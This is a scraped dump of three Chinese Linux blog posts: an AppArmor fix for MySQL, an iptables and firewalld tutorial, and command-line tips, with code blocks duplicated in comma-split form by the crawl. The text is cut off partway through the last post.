status=1/FAILURE,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,root,@,mylnx2,:,/,etc,/,mysql,/,mysql,.,conf,.,d,# service mysql status,●, ,mysql,.,service, ,-, ,MySQL ,Community ,Server,   ,Loaded,:, ,loaded, ,(,/,lib,/,systemd,/,system,/,mysql,.,service,;, ,enabled,;, ,vendor ,preset,:, ,enabled,),   ,Active,:, ,activating, ,(,start,-,post,), ,(,Result,:, ,exit,-,code,), ,since ,Mon, ,2018,-,10,-,15, ,22,:,33,:,00, ,CST,;, ,28s, ,ago,  ,Process,:, ,12947, ,ExecStart,=,/,usr,/,sbin,/,mysqld, ,(,code,=,exited,,, ,status,=,1,/,FAILURE,),  ,Process,:, ,12932, ,ExecStartPre,=,/,usr,/,share,/,mysql,/,mysql,-,systemd,-,start ,pre, ,(,code,=,exited,,, ,status,=,0,/,SUCCESS,), ,Main ,PID,:, ,12947, ,(,code,=,exited,,, ,status,=,1,/,FAILURE,),;,         ,:, ,12948, ,(,mysql,-,systemd,-,s,),    ,Tasks,:, ,2,   ,Memory,:, ,1.9M,      ,CPU,:, ,367ms,   ,CGroup,:, ,/,system,.,slice,/,mysql,.,service,           ,└─,control,             ,├─,12948, ,/,bin,/,bash, ,/,usr,/,share,/,mysql,/,mysql,-,systemd,-,start ,post,             ,└─,13045, ,sleep, ,1, ,Oct, ,15, ,22,:,33,:,00, ,mylnx2 ,systemd,[,1,],:, ,Starting ,MySQL ,Community ,Server,.,.,.,Oct, ,15, ,22,:,33,:,01, ,mylnx2 ,mysqld,[,12947,],:, ,2018,-,10,-,15T14,:,33,:,01.013763Z, ,0, ,[,Warning,], ,Changed ,limits,:, ,max_open_files,:, ,1024, ,(,requested, ,5000,),Oct, ,15, ,22,:,33,:,01, ,mylnx2 ,mysqld,[,12947,],:, ,2018,-,10,-,15T14,:,33,:,01.013836Z, ,0, ,[,Warning,], ,Changed ,limits,:, ,table_open_cache,:, ,431, ,(,requested, ,2000,),Oct, ,15, ,22,:,33,:,01, ,mylnx2 ,mysqld,[,12947,],:, ,2018,-,10,-,15T14,:,33,:,01.207533Z, ,0, ,[,Warning,], ,TIMESTAMP ,with ,implicit ,DEFAULT, ,value ,is, ,deprecated,., ,Please ,use, ,--,explicit,Oct, ,15, ,22,:,33,:,01, ,mylnx2 ,mysqld,[,12947,],:, ,2018,-,10,-,15T14,:,33,:,01.207663Z, ,0, ,[,Warning,], ,Can,'t create test file /mysql_data/mysql/mylnx2.lower-test,Oct 15 22:33:01 mylnx2 mysqld[12947]: 2018-10-15T14:33:01.207717Z 0 [Note] /usr/sbin/mysqld (mysqld 5.7.23-0ubuntu0.16.04.1-log) starting as process 129,Oct 15 22:33:01 mylnx2 mysqld[12947]: 2018-10-15T14:33:01.215413Z 0 [Warning] Can',t, ,create ,test ,file, ,/,mysql_data,/,mysql,/,mylnx2,.,lower,-,test,Oct, ,15, ,22,:,33,:,01, ,mylnx2 ,mysqld,[,12947,],:, ,2018,-,10,-,15T14,:,33,:,01.215445Z, ,0, ,[,Warning,], ,Can,',t, ,create ,test ,file, ,/,mysql_data,/,mysql,/,mylnx2,.,lower,-,test,Oct, ,15, ,22,:,33,:,01, ,mylnx2 ,systemd,[,1,],:, ,mysql,.,service,:, ,Main ,process ,exited,,, ,code,=,exited,,, ,status,=,1,/,FAILURE,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,\n,\n,\n,\n,\n,错误信息为“,[Warning] Can’t create test file /mysql_data/mysql/mylnx2.lower-test,”。其实这里是踩到了“AppArmor”这个坑，之前对Ubuntu了解不多，所以直到遇到这个问题，才了解、知道这么个概念。下面是百科对AppArmor的介绍：,\n,AppArmor是一个高效和易于使用的Linux系统安全应用程序。AppArmor对操作系统和应用程序所受到的威胁进行从内到外的保护，甚至是未被发现的0day漏洞和未知的应用程序漏洞所导致的攻击。AppArmor安全策略可以完全定义个别应用程序可以访问的系统资源与各自的特权。AppArmor包含大量的默认策略，它将先进的静态分析和基于学习的工具结合起来，AppArmor甚至可以使非常复杂的应用可以使用在很短的时间内应用成功。,\n,AppArmor对MySQL所能使用的目录权限做了限制，如下截图所示，规定了MySQL使用的数据文件路径权限。,\n,# cat /etc/apparmor.d/usr.sbin.mysqld,\n,\n,我将MySQL的数据库数据存储目录从/var/lib/mysql 切换到/mysql_data/mysql下面。所以就遇到了上面错误，需要修改或新增两条记录，从而使mysqld可以使用/mysql_data/mysql这个目录,\n,/mysql_data/mysql/ r,,\n,/mysql_data/mysql/** rwk,,\n,然后重启AppArmor服务后，然后就可以重启MySQL服务了。,\n,sudo service apparmor restart,\n,当然/etc/apparmor.d/usr.sbin.mysqld还有Allow plugin access需要调整，这个不是重点，在此略过。,\n,犹豫了一会，还是记录一下这个小小案例！虽然网上已有不少人总结这个，但是自己动手总结一下，印象也深刻一点！,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        ,  收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114485/", "url_object_id": "c2756a5fefdd2d0ac6c67a7d153278d5", "front_image_path": "full/35011d6168be00e949624c665041dc724e3ad786.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/10/b247395e59d0cc024e3bd8d4290425fa.jpg"], "title": "Linux 防火墙：关于 iptables 和 firewalld 的那些事", "create_time": "2018/10/03", "vote": "1", "bookmark": "2", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,David Clinton,   译文出处：,Linux中国/heguangzhi,   ,以下是如何使用 iptables 和 firewalld 工具来管理 Linux 防火墙规则。,\n,\n,这篇文章摘自我的书《,Linux in Action,》，尚未发布的第二个曼宁出版项目。,\n,防火墙,\n,防火墙是一组规则。当数据包进出受保护的网络区域时，进出内容（特别是关于其来源、目标和使用的协议等信息）会根据防火墙规则进行检测，以确定是否允许其通过。下面是一个简单的例子:,\n,\n,防火墙可以根据协议或基于目标的规则过滤请求。,\n,一方面， ,iptables, 是 Linux 机器上管理防火墙规则的工具。,\n,另一方面，,firewalld, 也是 Linux 机器上管理防火墙规则的工具。,\n,你有什么问题吗？如果我告诉你还有另外一种工具，叫做 ,nftables,，这会不会糟蹋你的美好一天呢？,\n,好吧，我承认整件事确实有点好笑，所以让我来解释一下。这一切都从 Netfilter 开始，它在 Linux 内核模块级别控制访问网络栈。几十年来，管理 Netfilter 钩子的主要命令行工具是 iptables 规则集。,\n,因为调用这些规则所需的语法看起来有点晦涩难懂，所以各种用户友好的实现方式，如 ,ufw, 和 firewalld 被引入，作为更高级别的 Netfilter 解释器。然而，ufw 和 firewalld 主要是为解决单独的计算机所面临的各种问题而设计的。构建全方面的网络解决方案通常需要 iptables，或者从 2014 年起，它的替代品 nftables (nft 命令行工具)。,\n,iptables 没有消失，仍然被广泛使用着。事实上，在未来的许多年里，作为一名管理员，你应该会使用 iptables 来保护的网络。但是 nftables 通过操作经典的 Netfilter 工具集带来了一些重要的崭新的功能。,\n,从现在开始，我将通过示例展示 firewalld 和 iptables 如何解决简单的连接问题。,\n,使用 firewalld 配置 HTTP 访问,\n,正如你能从它的名字中猜到的，firewalld 是 ,systemd, 家族的一部分。firewalld 可以安装在 Debian/Ubuntu 机器上，不过，它默认安装在 RedHat 和 CentOS 上。如果您的计算机上运行着像 Apache 这样的 web 服务器，您可以通过浏览服务器的 web 根目录来确认防火墙是否正在工作。如果网站不可访问，那么 firewalld 正在工作。,\n,你可以使用 ,firewall-cmd, 工具从命令行管理 firewalld 设置。添加 ,–state, 参数将返回当前防火墙的状态:,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# firewall-cmd --state\r\nrunning,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# firewall-cmd --state,running,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,默认情况下，firewalld 处于运行状态，并拒绝所有传入流量，但有几个例外，如 SSH。这意味着你的网站不会有太多的访问者，这无疑会为你节省大量的数据传输成本。然而，这不是你对 web 服务器的要求，你希望打开 HTTP 和 HTTPS 端口，按照惯例，这两个端口分别被指定为 80 和 443。firewalld 提供了两种方法来实现这个功能。一个是通过 ,–add-port, 参数，该参数直接引用端口号及其将使用的网络协议（在本例中为TCP）。 另外一个是通过 ,–permanent, 参数，它告诉 firewalld 在每次服务器启动时加载此规则：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# firewall-cmd --permanent --add-port=80/tcp\r\n# firewall-cmd --permanent --add-port=443/tcp,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# firewall-cmd --permanent --add-port=80/tcp,# firewall-cmd --permanent --add-port=443/tcp,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,–reload, 参数将这些规则应用于当前会话：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# firewall-cmd --reload,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# firewall-cmd --reload,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,查看当前防火墙上的设置，运行 ,–list-services,：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n# firewall-cmd --list-services\r\ndhcpv6-client http https ssh,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,# firewall-cmd --list-services,dhcpv6,-,client ,http ,https ,ssh,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,假设您已经如前所述添加了浏览器访问，那么 HTTP、HTTPS 和 SSH 端口现在都应该是和 ,dhcpv6-client, 一样开放的 —— 它允许 Linux 从本地 DHCP 服务器请求 IPv6 IP 地址。,\n,使用 iptables 配置锁定的客户信息亭,\n,我相信你已经看到了信息亭——它们是放在机场、图书馆和商务场所的盒子里的平板电脑、触摸屏和 ATM 类电脑，邀请顾客和路人浏览内容。大多数信息亭的问题是，你通常不希望用户像在自己家一样，把他们当成自己的设备。它们通常不是用来浏览、观看 YouTube 视频或对五角大楼发起拒绝服务攻击的。因此，为了确保它们没有被滥用，你需要锁定它们。,\n,一种方法是应用某种信息亭模式，无论是通过巧妙使用 Linux 显示管理器还是控制在浏览器级别。但是为了确保你已经堵塞了所有的漏洞，你可能还想通过防火墙添加一些硬性的网络控制。在下一节中，我将讲解如何使用iptables 来完成。,\n,关于使用 iptables，有两件重要的事情需要记住：你给出的规则的顺序非常关键；iptables 规则本身在重新启动后将无法保持。我会一次一个地在解释这些。,\n,信息亭项目,\n,为了说明这一切，让我们想象一下，我们为一家名为 BigMart 的大型连锁商店工作。它们已经存在了几十年；事实上，我们想象中的祖父母可能是在那里购物并长大的。但是如今，BigMart 公司总部的人可能只是在数着亚马逊将他们永远赶下去的时间。,\n,尽管如此，BigMart 的 IT 部门正在尽他们最大努力提供解决方案，他们向你发放了一些具有 WiFi 功能信息亭设备，你在整个商店的战略位置使用这些设备。其想法是，登录到 BigMart.com 产品页面，允许查找商品特征、过道位置和库存水平。信息亭还允许进入 bigmart-data.com，那里储存着许多图像和视频媒体信息。,\n,除此之外，您还需要允许下载软件包更新。最后，您还希望只允许从本地工作站访问 SSH，并阻止其他人登录。下图说明了它将如何工作：,\n,\n,*信息亭业务流由 iptables 控制。 *,\n,脚本,\n,以下是 Bash 脚本内容：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n#!/bin/bash\r\niptables -A OUTPUT -p tcp -d bigmart.com -j ACCEPT\r\niptables -A OUTPUT -p tcp -d bigmart-data.com -j ACCEPT\r\niptables -A OUTPUT -p tcp -d ubuntu.com -j ACCEPT\r\niptables -A OUTPUT -p tcp -d ca.archive.ubuntu.com -j ACCEPT\r\niptables -A OUTPUT -p tcp --dport 80 -j DROP\r\niptables -A OUTPUT -p tcp --dport 443 -j DROP\r\niptables -A INPUT -p tcp -s 10.0.3.1 --dport 22 -j ACCEPT\r\niptables -A INPUT -p tcp -s 0.0.0.0/0 --dport 22 -j DROP,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,#!/bin/bash,iptables, ,-,A, ,OUTPUT, ,-,p, ,tcp, ,-,d, ,bigmart,.,com, ,-,j, ,ACCEPT,iptables, ,-,A, ,OUTPUT, ,-,p, ,tcp, ,-,d, ,bigmart,-,data,.,com, ,-,j, ,ACCEPT,iptables, ,-,A, ,OUTPUT, ,-,p, ,tcp, ,-,d, ,ubuntu,.,com, ,-,j, ,ACCEPT,iptables, ,-,A, ,OUTPUT, ,-,p, ,tcp, ,-,d, ,ca,.,archive,.,ubuntu,.,com, ,-,j, ,ACCEPT,iptables, ,-,A, ,OUTPUT, ,-,p, ,tcp, ,--,dport, ,80, ,-,j, ,DROP,iptables, ,-,A, ,OUTPUT, ,-,p, ,tcp, ,--,dport, ,443, ,-,j, ,DROP,iptables, ,-,A, ,INPUT, ,-,p, ,tcp, ,-,s, ,10.0.3.1, ,--,dport, ,22, ,-,j, ,ACCEPT,iptables, ,-,A, ,INPUT, ,-,p, ,tcp, ,-,s, ,0.0.0.0,/,0, ,--,dport, ,22, ,-,j, ,DROP,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们从基本规则 ,-A, 开始分析，它告诉 iptables 我们要添加规则。,OUTPUT, 意味着这条规则应该成为输出链的一部分。,-p, 表示该规则仅使用 TCP 协议的数据包，正如 ,-d, 告诉我们的，目的地址是 ,bigmart.com,。,-j, 参数的作用是当数据包符合规则时要采取的操作是 ,ACCEPT,。第一条规则表示允许（或接受）请求。但，往下的规则你能看到丢弃（或拒绝）的请求。,\n,规则顺序是很重要的。因为 iptables 会对一个请求遍历每个规则，直到遇到匹配的规则。一个向外发出的浏览器请求，比如访问 bigmart.com 是会通过的，因为这个请求匹配第一条规则，但是当它到达 ,dport 80, 或 ,dport 443, 规则时——取决于是 HTTP 还是 HTTPS 请求——它将被丢弃。当遇到匹配时，iptables 不再继续往下检查了。（LCTT 译注：此处原文有误，径改。）,\n,另一方面，向 ubuntu.com 发出软件升级的系统请求，只要符合其适当的规则，就会通过。显然，我们在这里做的是，只允许向我们的 BigMart 或 Ubuntu 发送 HTTP 或 HTTPS 请求，而不允许向其他目的地发送。,\n,最后两条规则将处理 SSH 请求。因为它不使用端口 80 或 443 端口，而是使用 22 端口，所以之前的两个丢弃规则不会拒绝它。在这种情况下，来自我的工作站的登录请求将被接受，但是对其他任何地方的请求将被拒绝。这一点很重要：确保用于端口 22 规则的 IP 地址与您用来登录的机器的地址相匹配——如果不这样做，将立即被锁定。当然，这没什么大不了的，因为按照目前的配置方式，只需重启服务器，iptables 规则就会全部丢失。如果使用 LXC 容器作为服务器并从 LXC 主机登录，则使用主机 IP 地址连接容器，而不是其公共地址。,\n,如果机器的 IP 发生变化，请记住更新这个规则；否则，你会被拒绝访问。,\n,在家玩（是在某种一次性虚拟机上）？太好了。创建自己的脚本。现在我可以保存脚本，使用 ,chmod, 使其可执行，并以 ,sudo, 的形式运行它。不要担心“igmart-data.com 没找到”之类的错误 —— 当然没找到；它不存在。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nchmod +X scriptname.sh\r\nsudo ./scriptname.sh,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,chmod, ,+,X, ,scriptname,.,sh,sudo, ,.,/,scriptname,.,sh,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你可以使用 ,cURL, 命令行测试防火墙。请求 ubuntu.com 奏效，但请求 ,manning.com, 是失败的 。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\ncurl ubuntu.com\r\ncurl manning.com,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,curl ,ubuntu,.,com,curl ,manning,.,com,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,配置 iptables 以在系统启动时加载,\n,现在，我如何让这些规则在每次信息亭启动时自动加载？第一步是将当前规则保存。使用 ,iptables-save, 工具保存规则文件。这将在根目录中创建一个包含规则列表的文件。管道后面跟着 ,tee, 命令，是将我的,sudo, 权限应用于字符串的第二部分：将文件实际保存到否则受限的根目录。,\n,然后我可以告诉系统每次启动时运行一个相关的工具，叫做 ,iptables-restore, 。我们在上一章节（LCTT 译注：指作者的书）中看到的常规 cron 任务并不适用，因为它们在设定的时间运行，但是我们不知道什么时候我们的计算机可能会决定崩溃和重启。,\n,有许多方法来处理这个问题。这里有一个：,\n,在我的 Linux 机器上，我将安装一个名为 ,anacron, 的程序，该程序将在 ,/etc/, 目录中为我们提供一个名为 ,anacrontab, 的文件。我将编辑该文件并添加这个 ,iptables-restore, 命令，告诉它加载那个 .rule 文件的当前内容。当引导后，规则每天（必要时）01:01 时加载到 iptables 中（LCTT 译注：anacron 会补充执行由于机器没有运行而错过的 cron 任务，因此，即便 01:01 时机器没有启动，也会在机器启动会尽快执行该任务）。我会给该任务一个标识符（,iptables-restore,），然后添加命令本身。如果你在家和我一起这样，你应该通过重启系统来测试一下。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nsudo iptables-save | sudo tee /root/my.active.firewall.rules\r\nsudo apt install anacron\r\nsudo nano /etc/anacrontab\r\n1 1 iptables-restore iptables-restore < /root/my.active.firewall.rules,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,sudo ,iptables,-,save, ,|, ,sudo ,tee, ,/,root,/,my,.,active,.,firewall,.,rules,sudo ,apt ,install ,anacron,sudo ,nano, ,/,etc,/,anacrontab,1, ,1, ,iptables,-,restore ,iptables,-,restore, ,<, ,/,root,/,my,.,active,.,firewall,.,rules,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我希望这些实际例子已经说明了如何使用 iptables 和 firewalld 来管理基于 Linux 的防火墙上的连接问题。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114430/", "url_object_id": "773fc1a8e555569ee51769fa8059e14d", "front_image_path": "full/07850ca2fd9634c4790f1d328a559a2e5c8ac845.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "让你提高效率的 Linux 技巧", "create_time": "2018/09/30", "vote": "1", "bookmark": "3", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Sandra Henry-stocker,   译文出处：,Linux中国/Hank Chow,   ,想要在 Linux 命令行工作中提高效率，你需要使用一些技巧。,\n,巧妙的 Linux 命令行技巧能让你节省时间、避免出错，还能让你记住和复用各种复杂的命令，专注在需要做的事情本身，而不是你要怎么做。以下介绍一些好用的命令行技巧。,\n,命令编辑,\n,如果要对一个已输入的命令进行修改，可以使用 ,^a,（,ctrl + a,）或 ,^e,（,ctrl + e,）将光标快速移动到命令的开头或命令的末尾。,\n,还可以使用 ,^, 字符实现对上一个命令的文本替换并重新执行命令，例如 ,^before^after^, 相当于把上一个命令中的 ,before, 替换为 ,after, 然后重新执行一次。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ eho hello world  <== 错误的命令\r\nCommand 'eho' not found, did you mean:\r\n command 'echo' from deb coreutils\r\n command 'who' from deb coreutils\r\nTry: sudo apt install <deb name>\r\n$ ^e^ec^        <== 替换\r\necho hello world\r\nhello world,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,eho ,hello ,world,  ,<=,=, ,错误的命令,Command, ,'eho', ,not, ,found,,, ,did ,you ,mean,:, ,command, ,'echo', ,from ,deb ,coreutils, ,command, ,'who', ,from ,deb ,coreutils,Try,:, ,sudo ,apt ,install, ,<,deb ,name,>,$, ,^,e,^,ec,^,        ,<=,=, ,替换,echo ,hello ,world,hello ,world,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,使用远程机器的名称登录到机器上,\n,如果使用命令行登录其它机器上，可以考虑添加别名。在别名中，可以填入需要登录的用户名（与本地系统上的用户名可能相同，也可能不同）以及远程机器的登录信息。例如使用 ,server_name ='ssh -v -l username IP-address', 这样的别名命令：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ alias butterfly=”ssh -v -l jdoe 192.168.0.11”,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,alias ,butterfly,=,”,ssh, ,-,v, ,-,l, ,jdoe, ,192.168.0.11,”,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,也可以通过在 ,/etc/hosts, 文件中添加记录或者在 DNS 服务器中加入解析记录来把 IP 地址替换成易记的机器名称。,\n,执行 ,alias, 命令可以列出机器上已有的别名。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ alias\r\nalias butterfly='ssh -v -l jdoe 192.168.0.11'\r\nalias c='clear'\r\nalias egrep='egrep --color=auto'\r\nalias fgrep='fgrep --color=auto'\r\nalias grep='grep --color=auto'\r\nalias l='ls -CF'\r\nalias la='ls -A'\r\nalias list_repos='grep ^[^#] /etc/apt/sources.list /etc/apt/sources.list.d/*'\r\nalias ll='ls -alF'\r\nalias ls='ls --color=auto'\r\nalias show_dimensions='xdpyinfo | grep '\\''dimensions:'\\''',\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,11,12,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,alias,alias ,butterfly,=,'ssh -v -l jdoe 192.168.0.11',alias, ,c,=,'clear',alias ,egrep,=,'egrep --color=auto',alias ,fgrep,=,'fgrep --color=auto',alias ,grep,=,'grep --color=auto',alias, ,l,=,'ls -CF',alias ,la,=,'ls -A',alias ,list_repos,=,'grep ^[^#] /etc/apt/sources.list /etc/apt/sources.list.d/*',alias ,ll,=,'ls -alF',alias ,ls,=,'ls --color=auto',alias ,show_dimensions,=,'xdpyinfo | grep ',\\,','dimensions:',\\,','',\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,只要将新的别名添加到 ,~/.bashrc, 或类似的文件中，就可以让别名在每次登录后都能立即生效。,\n,冻结、解冻终端界面,\n,^s,（,ctrl + s,）将通过执行流量控制命令 XOFF 来停止终端输出内容，这会对 PuTTY 会话和桌面终端窗口产生影响。如果误输入了这个命令，可以使用 ,^q,（,ctrl + q,）让终端重新响应。所以只需要记住 ,^q, 这个组合键就可以了，毕竟这种情况并不多见。,\n,复用命令,\n,Linux 提供了很多让用户复用命令的方法，其核心是通过历史缓冲区收集执行过的命令。复用命令的最简单方法是输入 ,!, 然后接最近使用过的命令的开头字母；当然也可以按键盘上的向上箭头，直到看到要复用的命令，然后按回车键。还可以先使用 ,history, 显示命令历史，然后输入 ,!, 后面再接命令历史记录中需要复用的命令旁边的数字。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n!! <== 复用上一条命令\r\n!ec <== 复用上一条以 “ec” 开头的命令\r\n!76 <== 复用命令历史中的 76 号命令,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,!,!, ,<=,=, ,复用上一条命令,!,ec, ,<=,=, ,复用上一条以, ,“,ec,”, ,开头的命令,!,76, ,<=,=, ,复用命令历史中的, ,76, ,号命令,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,查看日志文件并动态显示更新内容,\n,使用形如 ,tail -f /var/log/syslog, 的命令可以查看指定的日志文件，并动态显示文件中增加的内容，需要监控向日志文件中追加内容的的事件时相当有用。这个命令会输出文件内容的末尾部分，并逐渐显示新增的内容。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ tail -f /var/log/auth.log\r\nSep 17 09:41:01 fly CRON[8071]: pam_unix(cron:session): session closed for user smmsp\r\nSep 17 09:45:01 fly CRON[8115]: pam_unix(cron:session): session opened for user root\r\nSep 17 09:45:01 fly CRON[8115]: pam_unix(cron:session): session closed for user root\r\nSep 17 09:47:00 fly sshd[8124]: Accepted password for shs from 192.168.0.22 port 47792\r\nSep 17 09:47:00 fly sshd[8124]: pam_unix(sshd:session): session opened for user shs by\r\nSep 17 09:47:00 fly systemd-logind[776]: New session 215 of user shs.\r\nSep 17 09:55:01 fly CRON[8208]: pam_unix(cron:session): session opened for user root\r\nSep 17 09:55:01 fly CRON[8208]: pam_unix(cron:session): session closed for user root\r\n        <== 等待显示追加的内容,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,7,8,9,10,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,tail, ,-,f, ,/,var,/,log,/,auth,.,log,Sep, ,17, ,09,:,41,:,01, ,fly ,CRON,[,8071,],:, ,pam_unix,(,cron,:,session,),:, ,session ,closed ,for, ,user ,smmsp,Sep, ,17, ,09,:,45,:,01, ,fly ,CRON,[,8115,],:, ,pam_unix,(,cron,:,session,),:, ,session ,opened ,for, ,user ,root,Sep, ,17, ,09,:,45,:,01, ,fly ,CRON,[,8115,],:, ,pam_unix,(,cron,:,session,),:, ,session ,closed ,for, ,user ,root,Sep, ,17, ,09,:,47,:,00, ,fly ,sshd,[,8124,],:, ,Accepted ,password ,for, ,shs ,from, ,192.168.0.22, ,port, ,47792,Sep, ,17, ,09,:,47,:,00, ,fly ,sshd,[,8124,],:, ,pam_unix,(,sshd,:,session,),:, ,session ,opened ,for, ,user ,shs ,by,Sep, ,17, ,09,:,47,:,00, ,fly ,systemd,-,logind,[,776,],:, ,New, ,session, ,215, ,of ,user ,shs,.,Sep, ,17, ,09,:,55,:,01, ,fly ,CRON,[,8208,],:, ,pam_unix,(,cron,:,session,),:, ,session ,opened ,for, ,user ,root,Sep, ,17, ,09,:,55,:,01, ,fly ,CRON,[,8208,],:, ,pam_unix,(,cron,:,session,),:, ,session ,closed ,for, ,user ,root,        ,<=,=, ,等待显示追加的内容,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,\n,寻求帮助,\n,对于大多数 Linux 命令，都可以通过在输入命令后加上选项 ,--help, 来获得这个命令的作用、用法以及它的一些相关信息。除了 ,man, 命令之外， ,--help, 